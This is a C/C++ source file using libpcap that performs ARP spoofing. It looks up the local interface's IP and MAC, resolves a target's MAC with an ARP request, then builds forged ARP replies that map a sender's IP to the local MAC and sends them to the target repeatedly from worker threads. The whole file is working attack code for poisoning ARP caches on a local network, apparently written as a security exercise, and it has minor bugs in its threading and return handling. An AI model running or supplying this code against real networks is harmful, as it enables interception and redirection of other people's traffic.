#include "myheader.h"
Ip getIPAddress(char*dev){
    int sock;
    struct ifreq ifr;
    struct sockaddr_in *sin;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        return 0;
    }
    strcpy(ifr.ifr_name, dev);
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0){
        close(sock);
        return 0;
    }
    sin = (struct sockaddr_in*)&ifr.ifr_addr;
    close(sock);
    return Ip(inet_ntoa(sin->sin_addr));
}

void convrt_mac(const char *data, char *cvrt_str, int sz){
     char buf[128] = {0,};
     char t_buf[8];
     char *stp = strtok((char *)data , ":" );
     int temp=0;

     do{
          memset( t_buf, 0, sizeof(t_buf) );
          sscanf( stp, "%x", &temp );
          snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
          strncat( buf, t_buf, sizeof(buf)-1 );
          strncat( buf, ":", sizeof(buf)-1 );
     } while( (stp = strtok( NULL , ":" )) != NULL );

     buf[strlen(buf) -1] = '\0';
     strncpy( cvrt_str, buf, sz );
}

Mac getMacAddress(char* dev){
    int sock;
    struct ifreq ifr;
    char mac_adr[18] = {0,};

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0){
       return 0;
    }
    strcpy(ifr.ifr_name, dev);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0){
        close(sock);
        return 0;
    }
    convrt_mac(ether_ntoa((struct ether_addr *)(ifr.ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr)-1);
    close(sock);
    return Mac(mac_adr);
}

EthArpPacket FindMac(Ip target,pcap_t* handle,Flow me){
    EthArpPacket packet = define_packet(Mac(BROADCAST),me.mac_,Mac(NONE),htonl(me.ip_),htonl(target));
    packet.arp_.op_ = htons(ArpHdr::Request);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    while(1){
        struct pcap_pkthdr* header;
        EthArpPacket* recv_packet;
        res = pcap_next_ex(handle, &header,(const u_char**)&recv_packet);
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        }
        if(recv_packet->eth_.type()!=0x806||recv_packet->arp_.op()!=2)continue;
        if(recv_packet->arp_.tip()!=me.ip_)continue;
        return *recv_packet;
    }
}

EthArpPacket define_packet(Mac dmac,Mac smac,Mac tmac,Ip sip,Ip tip){
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = sip;
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = tip;
    return packet;
}

void define_thread(Thread* t){
    t->me=(Flow*)malloc(sizeof(Flow));
    t->sender=(Flow*)malloc(sizeof(Flow));
    t->target=(Flow*)malloc(sizeof(Flow));
}

int cnt = 0;
void* arp(void*tt){
    Thread* thread = (Thread*)tt;
    if(cnt<2){
        EthArpPacket packet1 = FindMac(thread->target->ip_,thread->handle,*thread->me);
        thread->target->mac_=packet1.arp_.smac();
        cnt++;
    }
    EthArpPacket packet = define_packet(thread->target->mac_,thread->me->mac_,thread->target->mac_,htonl(thread->sender->ip_),htonl(thread->target->ip_));
    sleep(1);

    for(int i =0;i <3; i++){
        int res = pcap_sendpacket(thread->handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(thread->handle));
        }
    }
}

